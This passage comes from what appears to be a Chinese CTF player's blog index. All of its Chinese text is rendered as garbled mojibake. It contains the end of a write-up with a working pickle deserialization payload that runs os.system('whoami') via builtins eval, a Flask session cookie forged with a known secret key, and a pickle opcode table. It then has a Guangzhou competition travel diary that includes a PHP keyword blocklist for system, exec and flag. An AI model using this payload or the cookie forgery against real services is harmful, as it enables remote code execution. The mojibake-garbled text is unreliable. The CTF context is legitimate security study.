é‡Œçš„ä¸œè¥¿ï¼Œè¿˜å¸¦æœ‰é»‘åå•ï¼Œè¿‡æ»¤ Rã€‚ å¯ä»¥å‚è€ƒ è¿™ç¯‡ wp é‡Œçš„æ€è·¯ï¼Œå…ˆç”¨ pker è¿™ä¸ªå·¥å…·ç”Ÿæˆåªå¸¦ builtins ä½†å«æœ‰ R çš„ payloadã€‚ å…ˆçŸ¥ç¤¾åŒºï¼šé€šè¿‡ASTæ¥æ„é€ Pickle opcode getattr = GLOBAL('__builtins__', 'getattr') dict = GLOBAL('__builtins__', 'dict') dict_get = getattr(dict, 'get') globals = GLOBAL('__builtins__', 'globals') __builtins__ = globals() ____builtins____ = dict_get(__builtins__, '____builtins____') eval = getattr(____builtins____, 'eval') eval('__import__(\"os\").system(\"whoami\")') return b'cbuiltins\\ngetattr\\np0\\n0cbuiltins\\ndict\\np1\\n0g0\\n(g1\\nS\\'get\\'\\ntRp2\\n0cbuiltins\\nglobals\\np3\\n0g3\\n(tRp4\\n0g2\\n(g4\\nS\\'__builtins__\\'\\ntRp5\\n0g0\\n(g5\\nS\\'eval\\'\\ntRp6\\n0g6\\n(S\\'__import__(\"os\").system(\"whoami\")\\'\\ntR.' \"\"\" cbuiltins getattr p0 0cbuiltins dict p1 0g0 (g1 S'get' tRp2 0cbuiltins globals p3 0g3 (tRp4 0g2 (g4 S'__builtins__' tRp5 0g0 (g5 S'eval' tRp6 0g6 (S'__import__(\"os\").system(\"whoami\")' tR. \"\"\" è€Œåæ‰‹æ“ä¸€ä¸‹ï¼Œåœ¨è°ƒç”¨çš„ callable å‰æ·»åŠ  MARK å³ (ï¼Œå»æ‰ t æŒ‡ä»¤å’Œè°ƒç”¨ t æŒ‡ä»¤ç”¨åˆ°çš„ MARK. ä¹Ÿå°±æ˜¯ [callable] [tuple] R ===&gt; MARK [callable] [args...] o æ–‡ä¸­æ„é€ çš„ payload ä¸º b'''cbuiltins\\ngetattr\\np0\\n0cbuiltins\\ndict\\np1\\n0(g0\\ng1\\nS'get'\\nop2\\n0cbuiltins\\nglobals\\np3\\n0(g3\\nop4\\n0(g2\\ng4\\nS'__builtins__'\\nop5\\n0(g0\\ng5\\nS'eval'\\nop6\\n0(g6\\nS'__import__(\"os\").system(\"whoami\")'\\no.''' \"\"\" cbuiltins getattr p0 0cbuiltins dict p1 0(g0 g1 S'get' op2 0cbuiltins globals p3 0(g3 op4 0(g2 g4 S'__builtins__' op5 0(g0 g5 S'eval' op6 0(g6 S'__import__(\"os\").system(\"whoami\")' o. \"\"\" ç¼–ç  $ python3 flask_session_cookie_manager3.py encode -s 'y0u-wi11_neuer_kn0vv-!@#se%32' -t '{\"data\": \"Y2J1aWx0aW5zCmdldGF0dHIKcDAKMGNidWlsdGlucwpkaWN0CnAxCjAoZzAKZzEKUydnZXQnCm9wMgowY2J1aWx0aW5zCmdsb2JhbHMKcDMKMChnMwpvcDQKMChnMgpnNApTJ19fYnVpbHRpbnNfXycKb3A1CjAoZzAKZzUKUydldmFsJwpvcDYKMChnNgpTJ19faW1wb3J0X18oIm9zIikuc3lzdGVtKCJ3aG9hbWkiKScKby4=\", \"username\": \"adminadmin\"}' .eJxdkEFPgzAAhf9Lzx5gaDJMPDSdA9qUZOpW4NbSDRhtaWTIqPG_y9jBxMvLu3zfS943kPzCwTPIV9jn7Opx9uSQlkpGW0_GCSk3kNAobSRTvYzUUI625Sz1kIFXdIZd4SAp3CvZT9IU2c4gHY606sZ_vl6scC1iOvsooag2dLRf5WZ375U1KbQf2A9PuTlYEb9ZYdJTNpVEBND_29nfdpTU2x4vfL7waXVnOfNHEWAv89ddokOXNO1QBsrJ6HAhCAc8CmvB2oa8z97p8QU8gKE_fhquj_MDXOrGLAF-fgETQV-m.YRAnmg.C8b2ylZD1EDOLC3JLOFLZP9VGms ç„¶åæŠŠæºç é‡Œçš„ pickle.loads(data) æ”¹æˆ loads(data)ï¼Œæœ¬åœ°è¯•ä¸€è¯•ã€‚ Pickle å¸¸è§ opcodeï¼Œå®Œæ•´çš„å¯åœ¨$PYTHON/Lib/pickle.pyæŸ¥çœ‹ (via https://xz.aliyun.com/t/7012#toc-2) name op params describe e.g. REDUCE R [callable] [tuple] R è°ƒç”¨ä¸€ä¸ªcallableå¯¹è±¡ crandom\\nRandom\\n)R OBJ o MARK [callable] [argsâ€¦] o åŒINSTï¼Œå‚æ•°è·å–æ–¹å¼ç”±readlineå˜ä¸ºstack.popè€Œå·² (cos\\nsystem\\nSâ€™lsâ€™\\no INST i MARK [argsâ€¦] i [module] [cls] æ„é€ ä¸€ä¸ªç±»å®ä¾‹ï¼ˆå…¶å®ç­‰åŒäºè°ƒç”¨ä¸€ä¸ªcallableå¯¹è±¡ï¼‰ï¼Œå†…éƒ¨è°ƒç”¨äº†find_class (Sâ€™lsâ€™\\nios\\nsystem\\n MARK ( null å‘æ ˆé¡¶pushä¸€ä¸ªMARK STOP . null ç»“æŸ POP 0 null ä¸¢å¼ƒæ ˆé¡¶ç¬¬ä¸€ä¸ªå…ƒç´  POP_MARK 1 null ä¸¢å¼ƒæ ˆé¡¶åˆ°MARKä¹‹ä¸Šçš„ç¬¬ä¸€ä¸ªå…ƒç´  DUP 2 null åœ¨æ ˆé¡¶èµ‹å€¼ä¸€æ¬¡æ ˆé¡¶å…ƒç´  FLOAT F F [float] pushä¸€ä¸ªfloat F1.0 INT I I [int] pushä¸€ä¸ªinteger I1 NONE N null pushä¸€ä¸ªNone STRING S S [string] pushä¸€ä¸ªstring S â€˜xâ€™ UNICODE V V [unicode] pushä¸€ä¸ªunicode string V â€˜xâ€™ APPEND a [list] [obj] a å‘åˆ—è¡¨appendå•ä¸ªå¯¹è±¡ ]I100\\na BUILD b [obj] [dict] b æ·»åŠ å®ä¾‹å±æ€§ï¼ˆä¿®æ”¹__dict__ï¼‰ cmodule\\nCls\\n)R(I1\\nI2\\ndb GLOBAL c c [module] [name] è°ƒç”¨Picklerçš„find_classï¼Œå¯¼å…¥module.nameå¹¶pushåˆ°æ ˆé¡¶ cos\\nsystem\\n DICT d MARK [[k] [v]â€¦] d å°†æ ˆé¡¶MARKä»¥å‰çš„å…ƒç´ å¼¹å‡ºæ„é€ dictï¼Œå†pushå›æ ˆé¡¶ (I0\\nI1\\nd EMPTY_DICT } null pushä¸€ä¸ªç©ºdict APPENDS e [list] MARK [objâ€¦] e å°†æ ˆé¡¶MARKä»¥å‰çš„å…ƒç´ appendåˆ°å‰ä¸€ä¸ªçš„list ](I0\\ne GET g g [index] ä»memoè·å–å…ƒç´  g0 LIST l MARK [obj] l å°†æ ˆé¡¶MARKä»¥å‰çš„å…ƒç´ å¼¹å‡ºæ„é€ ä¸€ä¸ªlistï¼Œå†pushå›æ ˆé¡¶ (I0\\nl EMPTY_LIST ] null pushä¸€ä¸ªç©ºlist PUT p p [index] å°†æ ˆé¡¶å…ƒç´ æ”¾å…¥memo p0 SETITEM s [dict] [k] [v] s è®¾ç½®dictçš„é”®å€¼ }I0\\nI1\\ns TUPLE t MARK [objâ€¦] t å°†æ ˆé¡¶MARKä»¥å‰çš„å…ƒç´ å¼¹å‡ºæ„é€ tupleï¼Œå†pushå›æ ˆé¡¶ (I0\\nI1\\nt EMPTY_TUPLE ) null pushä¸€ä¸ªç©ºtuple SETITEMS u [dict] MARK [[k] [v]â€¦] u å°†æ ˆé¡¶MARKä»¥å‰çš„å…ƒç´ å¼¹å‡ºupdateåˆ°å‰ä¸€ä¸ªdict }(I0\\nI1\\nu å°ç»“é¢˜ç›®ä¹Ÿå¤ªé¡¶å•¦ï¼ Misc å°±ä¿©é¢˜ï¼Œå¦ä¸€é¢˜æ˜¯ä¸ªé›¶è§£çš„å†…å­˜é•œåƒå–è¯ï¼Œæå–å‡ºæ¥ä¸€å¼ å¾®ä¿¡æ”¶åˆ°çš„å›¾ç‰‡ï¼Œç„¶å LSB æœ‰ä¸ªçœ‹ä¸Šå»åƒæ˜¯ AES çš„å­—ç¬¦ä¸²ï¼Œä½†æ‰¾äº†åŠå¤©æ²¡æ‰¾åˆ°å¯†é’¥åœ¨å“ªâ€¦â€¦ çº¿ä¸Šåˆèµ›æ‰åªæœ‰12æ”¯æˆ˜é˜Ÿæ™‹çº§ï¼Œå¤ªéš¾äº†ï¼Œå–µå‘œå‘œå‘œï¼ å°±è¿™æ ·å§â€¦â€¦ ï¼ˆæºœäº†æºœäº†å–µ --&gt;","path":"2021/08/07/CTF_2021dianfengjike/"},{"title":"ç¢ç¢å¿µ | 2021 çº¢å¸½æ¯ ç½‘ç»œå®‰å…¨å¤§èµ›æ€»å†³èµ› å¹¿å·æ¸¸è®°","text":"æœ¬æ–‡è°¢ç»è½¬è½½ï¼ å¼•è¨€å‰å‡ å¤©å»å¹¿ä¸œçœå¹¿å·å¸‚æ‰“äº†ä¸ª ç¬¬å››å±Š çº¢å¸½æ¯ ç½‘ç»œå®‰å…¨å¤§èµ›æ€»å†³èµ›ï¼Œé¡ºä¾¿å°±åœ¨å¹¿å·éšä¾¿è½¬äº†è½¬ã€‚ éš¾å¾—æœ‰æœºä¼šè¿›äº†çº¿ä¸‹ï¼Œå¯æƒœé˜Ÿå‹å› ä¸ºç–«æƒ…éƒ½åœ¨å—äº¬å‡ºä¸æ¥äº†ï¼Œåªæœ‰å–µå–µæ²¡å—äº¬æ—…å±…å²ï¼Œäºæ˜¯å°±ä¸€ä¸ªäººå»æ‘¸é±¼äº† 2333. è¿™ç¯‡ä¸»è¦å°±æ˜¯å–µå–µåœ¨å¹¿å·çš„æ¸¸è®°å•¦ï¼ ï¼ï¼ï¼å¤š å›¾ é¢„ è­¦ï¼ï¼ï¼ ï¼ï¼ï¼æµ é‡ é¢„ è­¦ï¼ï¼ï¼ æ¯”èµ›èµ›åˆ¶æ¯”èµ›çš„è¯å°± 24 å·ä¸€å¤©ï¼Œä»æ—©ä¸Š 11:15 æ‰“åˆ° ä¸‹åˆ 17:15ï¼Œæ—¶é•¿ 6hï¼Œè¿™ä¸ªæ¯”èµ›æ—¶é—´å°±å¾ˆè¿·ï¼Œæƒ³ä¸åˆ°å§ã€‚ è¿™æ¬¡æ˜¯å–µå–µç¬¬ä¸€æ¬¡æ‰“ AWD plus èµ›åˆ¶ï¼Œæ”»å‡»åˆ†å’Œé˜²å¾¡åˆ†åˆ†åˆ«è®¡ç®—è€ŒååŠ åœ¨ä¸€èµ·ï¼Œé€‰æ‰‹æ²¡æœ‰å¯¹é¶æœºçš„æ§åˆ¶æƒï¼Œå…¨ç¨‹ä¸æ¥è§¦ sshã€‚ å°±æ˜¯è§‰å¾—æ²¡é‚£ä¹ˆæœ‰æ„æ€ï¼Œå…¶å®å°±å’Œè§£é¢˜ break + ä¿®å¤ fix å·®ä¸å¤šäº†ï¼Œç¼ºå°‘äº†ç‚¹å¯¹æŠ—çš„å‘³é“äº†ã€‚åªä¸è¿‡å¤šäº†ä¸ªè½®æ¬¡çš„æ¦‚å¿µï¼Œæ¯ä¸ªæˆ˜é˜Ÿåˆå§‹ç§¯åˆ† 5000 åˆ†ï¼Œ20 min/è½®æ¬¡ï¼Œå¦‚æœæäº¤ flag æ­£ç¡®å³ break æˆåŠŸçš„è¯ï¼Œå¹³å°æ¯è½®ä¼šè‡ªåŠ¨æ”»å‡»å…¶ä»–æœªä¿®è¡¥æ¼æ´çš„æˆ˜é˜Ÿï¼ŒæŠŠåŠ¨æ€çš„ç§¯åˆ†ç»™æœ¬é˜Ÿã€‚ä¸å…¶è¯´æ˜¯æ”»å‡»ï¼Œå¹³å°æŠ€æœ¯å±‚é¢æ„Ÿè§‰å…¶å®å°±æ˜¯çœ‹æœ‰å¤šå°‘é˜Ÿæ²¡ fix ç½¢äº†ã€‚è¿™é‡Œçš„åŠ¨æ€ç§¯åˆ†å’Œè§£å‡º flag çš„é˜Ÿä¼æ•°ã€éš¾åº¦ç³»æ•°ã€è§£é¢˜æ—¶é—´æœ‰å…³ã€‚ Fix çš„è¯ï¼Œæ˜¯é€šè¿‡ ftp ä¸Šä¼ ä¸€ä¸ªå¸¦æœ‰ update.sh æ–‡ä»¶çš„ xxx.tar.gz å‹ç¼©åŒ…è¿›è¡Œçš„ï¼Œé€šè¿‡ç±»ä¼¼ mv -f xxx /var/www/html/xxx çš„æ“ä½œæŠŠæ–‡ä»¶è¦†ç›–æ‰ä»è€Œè¿›è¡Œä¿®æ”¹ã€‚ç”³è¯·éªŒè¯ä¹‹åå¹³å°ä¼šç”¨ check å’Œ exp å»æµ‹è¯•è¿™ä¸ªç¯å¢ƒï¼Œå¦‚æœ check æˆåŠŸè€Œ exp å¤±è´¥ï¼Œå°±è®¤ä¸º fix æˆåŠŸäº†ï¼›å¦‚æœäºŒè€…éƒ½æˆåŠŸï¼Œè¯´æ˜ fix å¤±è´¥ï¼›å¦‚æœ check å¤±è´¥äº†ï¼Œå°±è¯´æ˜ä¿®ç‚¸äº†ï¼Œè¿˜åè€Œä¼šæ¯è½®æ‰£ 200 åˆ†ã€‚ å…¶å®è¿™æ ·çš„èµ›åˆ¶å¯¹å¹³å°è€Œè¨€å°±å¾ˆå‹å¥½äº†ï¼Œæ¯•ç«Ÿå°‘äº†é˜Ÿä¼ä¹‹é—´ç›´æ¥çš„æ¿€çƒˆçš„æµé‡äº¤äº’ï¼Œèµ„æºæ¶ˆè€—å°±å¤§å¹…åº¦å‡å°‘äº†ã€‚æ¯ä¸ªæˆ˜é˜Ÿæ¯é¢˜ä¸€ä¸ªç‹¬äº«ç¯å¢ƒï¼Œfix çš„ check ç¯èŠ‚æ•´å‡ ä¸ªå…¬å…±ç¯å¢ƒï¼Œå¤§å®¶æ’ä¸ªé˜ŸéªŒè¯å°±å®Œäº‹äº†ï¼Œbreakã€fix çš„æˆåŠŸä¸å¦æ•´å‡ ä¸ªæ ‡å¿—ä½ï¼Œå†åŠ ä¸Šä¸€å¥—åˆ¤åˆ†é€»è¾‘å°±å·®ä¸å¤šäº†ã€‚ ï¼ˆå½“ç„¶è¿™é‡Œåªæ˜¯å’±éšä¾¿çŒœæƒ³è€Œå·²å•¦ï¼ŒçœŸå®åœºæ™¯è‚¯å®šè¦æ¯”è¿™ä¸ªå¤æ‚ é¢˜ç›®è¯´å®Œäº†èµ›åˆ¶ä¸‹é¢å°±è¦è¯´ æ¯”èµ›é¢˜ç›® äº†ã€‚çé¸¡å„¿å” å—‘å‡ å¥ï¼Œä¸æƒ³çœ‹çš„è¯å°±è·³è¿‡å§ã€‚ è¿™æ¬¡ç®—æ˜¯ 3 web + 3 pwn å§ï¼Œè™½ç„¶ä¸çŸ¥é“æœ‰ä¸ª golang çš„ web æ˜¯ä¸æ˜¯ä¹Ÿå’Œ binary æœ‰å…³ã€‚ å¯æƒœçš„æ˜¯æ¯”èµ›å¼€å§‹å‰å‡ å¤©å—äº¬çªå‘äº†æ–°å† ç–«æƒ…ï¼Œæ­£å¥½é˜Ÿå‹ pwnğŸ‘´ğŸ»ä»¬éƒ½åœ¨å—äº¬å‡ºä¸æ¥ï¼Œæœ€ååªå‰©ä¸‹å–µå–µä¸€ä¸ªäººè‡ªå·±æ‘¸é±¼äº†ï¼Œæ²¡äººä¸€èµ·èŠå¤©ä¸€èµ·ğŸ¤ºï¼Œç¡¬æ˜¯åäº†ä¸€å¤©ï¼Œä¹Ÿå¤ªéš¾å—äº†ã€‚ï¼ˆæ‘Šæ‰‹ Web çš„è¯ï¼Œå‡ºäº†ä¸ª upload ä¸Šä¼ ï¼Œå…¶ä¸­æœ‰ä¸ªä» SESSION ä¸­å–å‡ºå‡½æ•°åæ‰§è¡Œï¼Œå¯»æ€ç€å¯èƒ½æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œå’±å°±è¿‡æ»¤äº†å‡ ä¸ª å‘½ä»¤æ‰§è¡Œ çš„å…³é”®å‡½æ•°ç„¶åå°± fix æˆåŠŸäº†ã€‚æœ‰çš„å¸ˆå‚… è¿‡æ»¤æ‰ ../ ä¹Ÿä¿®æˆåŠŸäº†ã€‚ break çš„è¯æ¯”èµ›çš„æ—¶å€™è¿˜åœ¨æƒ³æ˜¯ä¸æ˜¯ç±»ä¼¼äº TCTF 2021 é‚£ä¸ª session ä¸Šä¼ ï¼Œä½†åˆä¸ä¼šç©â€¦â€¦æœ€åç¡®å®æ˜¯è¿™æ ·ï¼Œé€šè¿‡ ../ ç›®å½•ç©¿è¶Šç›´æ¥æ„é€  session ä¸Šä¼ å†™åˆ° /tmp ä¸‹ç„¶åè°ƒç”¨å§ã€‚ æ­¤å¤–æœ‰ä¸ª cmsï¼Œopensnsï¼ŒåŸºäº ThinkPHP äºŒæ¬¡å¼€å‘çš„ã€‚è¿™é¢˜æ°”æ­»äº†ï¼Œä»–ç»™çš„æ–‡ä»¶æœ‰ä¸ª log é‡Œé¢å°±æœ‰ payloadï¼Œpeiqi wiki æ–‡åº“é‡Œä¹Ÿæœ‰ç°æˆ payloadã€‚å–µå–µä¸‹è½½ä¸‹æ¥äº†ç„¶è€Œ VS Code æœç´¢å‡ºæ¥äº†ä¸€å †å†—ä½™ä¿¡æ¯ï¼Œäºæ˜¯ä¸€ç›´åœ¨è¯• SQL æ³¨å…¥çš„æ´ï¼Œè¿™ä¸ªå‰å° RCE çš„æ´å°±æ²¡å‘ç°ï¼Œç„¶åå®¡äº†åŠå¤©æºç ä¹Ÿæ²¡æ‰¾åˆ°æ´â€¦â€¦èµ›åå¬å…¶ä»–é˜Ÿå¸ˆå‚…è¯´ç°æˆ 1day ç›´æ¥å¿ƒæ€ç‚¸äº†ï¼Œè‰ã€‚ è¿˜æœ‰ä¸ª golang å†™çš„ç¨‹åºï¼Œflag å­˜åœ¨ root ç”¨æˆ· ssh çš„å¯†ç ä¸Šï¼Œå¤–é¢æ˜¯ä¸€å±‚ JWT é‰´æƒï¼Œé‰´æƒé€šè¿‡ä¹‹åå¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œå¥½åƒæ˜¯å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå¯»æ€ç€åº”è¯¥å¾—é€šè¿‡å•¥åŠæ³•è¯»åˆ° JWT çš„å¯†é’¥ç„¶åæ”¹æˆ admin è¿™æ ·å†è¿›ä¸€æ­¥æ“ä½œå§ï¼Œç­‰å¤§å¸ˆå‚…ä»¬çš„ wp äº†ã€‚è¿™é¢˜è¿œç¨‹æ˜¯ç›´æ¥ä¸€ä¸ª binary å¯æ‰§è¡Œç¨‹åºè·‘èµ·æ¥çš„ï¼Œå…¶ä»–å¸ˆå‚…è¯´ç»™çš„æºç é‡Œçš„ binary æ˜¯ macOS ä¸‹ç”Ÿæˆçš„ï¼Œå’Œè¿œç¨‹è¿˜ä¸ä¸€æ ·ï¼Œç°åœºåˆæ²¡ç»™ golang ç¯å¢ƒï¼Œå’±ä¸ä¼šä¿®ä¹Ÿæ²¡æ³•ä¿®ï¼Œå–µå‘œâ€¦â€¦ ä¸è¿‡è¿™ä¸ª fix çš„è¯å…¶å®æœ‰ç‚¹è¿·ï¼Œæ¯•ç«Ÿåªéœ€è¦å®˜æ–¹çš„ exp æ‰“ä¸é€šå°±åˆ¤å®šä¿®æˆåŠŸäº†ã€‚äºæ˜¯æœ‰çš„å¸ˆå‚…ç›´æ¥æ•´äº†ä¸ªé€šé˜²ï¼Œæ¯”å¦‚è¯·æ±‚å‚æ•°é‡Œå­˜åœ¨å‘½ä»¤æ‰§è¡Œï¼Œæˆ–è€… flag ä¹‹ç±»çš„å…³é”®å­—ï¼Œç›´æ¥ die å°±å®Œäº‹äº†ã€‚ è¿™é‡Œé¡ºä¾¿æ”¾ä¸ª T4rn å¸ˆå‚…çš„é€šé˜²ã€‚ if (preg_match('/system|tail|flag|exec|base64/i', $_SERVER['REQUEST_URI'])) { die('no!'); } $str =\"\"; foreach ($_POST as $key =&gt; $value) { $str.=$key; $str.=$value; } if (preg_match(\"/system|tail|flag|exec|base64/i\", $str)) { die('no!'); } å¯æ‰§è¡Œç¨‹åºçš„ fix å‚è€ƒè„šæœ¬ã€‚ # update.sh cp ./ä¿®æ”¹åç¼–è¯‘å¥½çš„æ–‡ä»¶ /ç¼–è¯‘æ–‡ä»¶çš„ç›®å½• ps -ef |grep ç¼–è¯‘çš„åå­—| awk '{print $2}' | xargs kill -9 cd /ç¼–è¯‘æ–‡ä»¶ç›®å½• &amp;&amp;./æ‰§è¡Œç¼–è¯‘æ–‡ä»¶ &gt; /dev/null 2&gt;&amp;1 åé¢æœ‰ç¯å¢ƒæœ‰å¯èƒ½çš„è¯å†å¤ç°ä¸€ä¸‹å†™ç¯‡åšå®¢å§ï¼Œå¦‚æœä¸å’•çš„è¯ã€‚ Pwn é¢˜çš„è¯ï¼Œå–µå–µä¸ä¼š binary å•Šå•Šå•Šå•Šå•Šå•Šï¼æœ‰ä¸ª rust é€†å‘ï¼Œæœ‰ä¸ª python å†™çš„ç¼–è¯‘å™¨ï¼Œè¿˜æœ‰ä¸ª http æœåŠ¡çš„å †é¢˜ï¼ˆè¿˜æ˜¯èµ›åé—®åˆ«çš„å¸ˆå‚…æ‰çŸ¥é“æ˜¯ä¸ªå †é¢˜ï¼Œåªä¸è¿‡æŠŠèœå•æ¢æˆäº† HTTP server ç½¢äº†ï¼‰ï¼Œå”‰ã€‚ å™¢ï¼Œè¿™ä¸ªæ¯”èµ›çº¿ä¸‹æ˜¯æ”¶äº†æ‰‹æœºä¸èƒ½ä¸Šç½‘çš„ï¼Œéš¾å—æ­»äº†å•Šå•Šå•Šå•Šå•Šå•Šï¼ï¼ˆè™½ç„¶å¬è¯´ç…§æ ·æœ‰é˜Ÿä¼æˆåŠŸå‡ºåˆ°å¤–ç½‘å»äº† çœ‹ç€å°±ç»æœ›ï¼ˆ è¿˜å¥½æ²¡çˆ†é›¶ï¼ˆæ‘Šæ‰‹ å…¶ä»–æ¯”èµ›ç»“æŸåæœ‰ä¸ª èˆè¹ˆè¡¨æ¼”ï¼Œèˆå°ç¯å…‰å•¥çš„è¿˜æ˜¯æŒºåˆ°ä½çš„ï¼Œå…¶ä»–æ¯”èµ›å¿«å­¦ä¸€å­¦ã€‚ ï¼ˆå¯æƒœå°±è¿™ä¸€ä¸ªèŠ‚ç›® 233 ä»¥åŠï¼Œå¤§å®¶æ‰“å¼€æ‰‹æœºçš„é—ªå…‰ç¯ï¼ŒåŸæ¥è¿™ä¸ªå°±å«åš æ˜Ÿç©ºå¤§åˆå½± å•Šã€‚ æœ€å…³é”®æ˜¯å«–é”®ç›˜å–µï¼ çº¢å¸½æ¯é™é‡ç‰ˆæœºæ¢°é”®ç›˜ï¼ æ˜¯é»‘è½´ï¼Œç”¨èµ·æ¥æ„Ÿè§‰è¿˜æ˜¯æŒºé¦™çš„ï¼Œç°åœ¨å°±ç”¨è¿™ä¸ªé”®ç›˜ç å­—å‘¢ï¼ˆ é¢åŸºè¿™æ¬¡é¢åŸºäº† æ°´å‡½ã€T4rnã€keerã€èŠ‹å¤´ã€batkizã€Nohnâ€¦ å¯æƒœæ¯”èµ›ç»“æŸå¾—å¤ªå¿«ï¼Œæœ‰å‡ ä¸ªå¸ˆå‚…çº¦äº†ä½†æ²¡é¢ä¸Šï¼Œå‘œå‘œã€‚ çº¿ä¸‹å’Œå¸ˆå‚…ä»¬é¢åŸºçš„æ—¶å€™å€’æ²¡å•¥åˆå½±ï¼Œåªæœ‰ tg è¿™è¾¹ç¥ç§˜çš„é¢åŸºä»ªå¼äº†ã€‚ æ¸¸ç©ä¸‹é¢å°±å‡Œä¹±åœ°å†™ä¸€ä¸‹æ¸¸è®°å§ã€‚ åœ¨è·¯è¾¹å‘ç°äº†æœ‰ä¸€å®šå¹´çºªçš„ IC å¡å…¬ç”¨ç”µè¯ï¼Œå¯æƒœè²Œä¼¼æ— æ³•ä½¿ç”¨äº†ã€‚ æ™šä¸Šå»äº†å¸‚ä¸­å¿ƒï¼Œé¡ºç€èŠ±åŸå¹¿åœºä¸€è·¯é€›åˆ°äº†å¹¿å·å¡”ï¼Œä¹Ÿå°±æ˜¯å°è›®è…°ï¼Œé¡ºä¾¿çœ‹äº†ç æ±Ÿã€‚ è¿‡äº†ä¸ªç æ±Ÿï¼Œå°±åˆ°äº†å¹¿å·å¡”è„šä¸‹ã€‚ å½“ç„¶è¿˜æœ‰ç†„ç¯åçš„ã€‚ å¹¿å·å¡”è§‚å…‰é—¨ç¥¨æŒºè´µçš„ï¼ˆ æ‰“å¡äº† ä¸»åŠæ–¹æŠ•çš„å¤§å±å¹¿å‘Šã€‚ ç æ±Ÿã€‚ è¿™ä¸ª APM è‡ªåŠ¨æ—…å®¢è¾“é€ç³»ç»Ÿ æŒºæœ‰æ„æ€çš„ã€‚ å…¶å®ä¹Ÿæ˜¯åœ°é“ï¼Œåªæ˜¯å°±ä¸¤èŠ‚è½¦å¢ï¼Œç®—æ˜¯è‡ªåŠ¨é©¾é©¶å§ã€‚ä¸è¿‡å…¶å®è¿˜æ˜¯æœ‰ä¸ªå¸ˆå‚…åœ¨è½¦ä¸Šçœ‹ç€çš„ï¼Œå¸ˆå‚…è¿˜è¯´ï¼Œè¦æ˜¯æœ‰ä¸€å¤©ä¸éœ€è¦æœ‰äººåœ¨è½¦ä¸Šå®ˆç€äº†ï¼Œé‚£æ‰æ˜¯çœŸæ­£çš„è‡ªåŠ¨é©¾é©¶äº†ã€‚2333 å¹¿å·å¡”å‰çš„æœ‰è½¨ç”µè½¦ è·¯ä¸Šçš„å…¬äº¤æ— è½¨ç”µè½¦ å¹¿å·è¿˜æœ‰ ä¹¦æŠ¥äº­ å”‰ åœ°é“1å·çº¿ ç«™å°å’Œè½¦å¢ä¸€çœ‹å°±å†å²æ‚ ä¹…äº†ã€‚ ä¸€è·¯ä¸Šçš„ éª‘æ¥¼ å§‹äºå…¬å…ƒå‰214å¹´çš„ åŒ—äº¬è·¯ï¼Œå†å²çœŸæ‚ ä¹…å•Šã€‚ é¥±ç»å†å²æ²§æ¡‘çš„ æ²™é¢å²›ï¼ŒæŒºå¤šæ¥è¿™æ‹ç…§æ‰“å¡çš„ï¼Œè¿˜æœ‰å¸¦ç€å„ç§æ‘„å½±å¤§ç‚®çš„ã€‚ æ³¢å…°é©»å¹¿å·æ€»é¢†äº‹é¦†ç°åœ¨å°±åœ¨å²›ä¸Šï¼Œé—¨å£å·¦å³è¿˜æœ‰ä¿©æˆ˜å£«æ‰§å‹¤çš„ï¼Œé‚£é—¨å£ä¸èƒ½æ‹ç…§ è¿˜æœ‰å¤–å›½äººåœ¨å”±è‹±æ–‡æ­Œï¼ˆå”±çš„å•¥å¿˜äº† å½“ç„¶è¿˜å°‘ä¸äº† å¸å–µå–µ å•¦~ ï¼ˆæ˜¯ä¸¤åªåœ¨ å–µå‘œ çš„å–µå–µ æ°é¥­å„ç§å¥½åƒçš„ï¼Œå¹¿ä¸œèŒ¶ç‚¹ï¼ˆæ²¡æ‹å¤šå°‘ï¼‰ã€é±¼çš®ã€äº‘åé¢ã€åŒçš®å¥¶ã€çƒ§é¸­é¥­â€¦â€¦ å‡‰æ‹Œé±¼çš®å§ï¼Œè¿˜æŒºæœ‰å‘³é“çš„ï¼ŒçœŸæ²¡æƒ³åˆ°ä¸“é—¨åšé±¼çš®ä¹Ÿèƒ½åšå¾—æŒºå¤§çš„äº†ã€‚ ä¸è¡Œï¼Œç ç€å­—ç°åœ¨çœ‹ç€è‚šå­é¥¿äº†ã€‚ é‚£å°±å…ˆè¿™æ ·å§å•Šå•Šå•Šã€‚ å°ç»“å¤§æ¦‚å°±æ˜¯â€”â€” æ‰“æ¯”èµ› x åˆ’æ°´æ‘¸é±¼å«–é”®ç›˜é¢åŸºæ—…æ¸¸ sqrt å…¶å®ç©å¾—è¿˜æ˜¯æŒºå¼€å¿ƒçš„å–µ~ ï¼ˆå’•å’•å’•ï¼Œç»ˆäºå†™å®Œäº† å½“ç„¶å¦‚æœå“ªé‡Œå†™çš„æœ‰é—®é¢˜ï¼Œè¿˜å¸Œæœ›å¸ˆå‚…ä»¬å¸¦å¸¦å¼Ÿå¼Ÿï¼ˆ Extensive Reading CTF | 2021 çº¢å¸½æ¯ WriteUp ç¢ç¢å¿µ | 2021 å¼ºç½‘æ¯S5 å…¨å›½ç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ›çº¿ä¸‹èµ› éƒ‘å·æ¸¸è®° ç¢ç¢å¿µ | X-NUCA 2020 å…¨å›½é«˜æ ¡ç½‘å®‰è”èµ›æ€»å†³èµ› æ·±åœ³æ¸¸è®° ï¼ˆæºœäº†æºœäº†å–µ~","path":"2021/07/29/Life_2021RedHatFinal_trip/"},{"title":"ç¢ç¢å¿µ | 2021 å¼ºç½‘æ¯S5 å…¨å›½ç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ›çº¿ä¸‹èµ› éƒ‘å·æ¸¸è®°","text":"æœ¬æ–‡è°¢ç»è½¬è½½ï¼ å‰è¨€å‰æ®µæ—¶é—´å»æ²³å—éƒ‘å·æ‰“äº†ä¸ª å¼ºç½‘æ¯S5 å…¨å›½ç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ›çº¿ä¸‹èµ›ï¼Œé¡ºä¾¿å’Œå¸ˆå‚…ä»¬åœ¨é™„è¿‘ç©äº†ç©ï¼Œè¿™ç¯‡å¤§æ¦‚ç®—æ˜¯ä¸ªéƒ‘å·çš„æ¸¸è®°å§ï¼Œå†™å¾—å°±æ¯”è¾ƒéšæ„ æ˜¯æµæ°´è´¦ å•¦ã€‚ å¾ˆéš¾å¾—çº¿ä¸Šèµ›æŒ¤è¿›äº†å…¨å›½å‰ 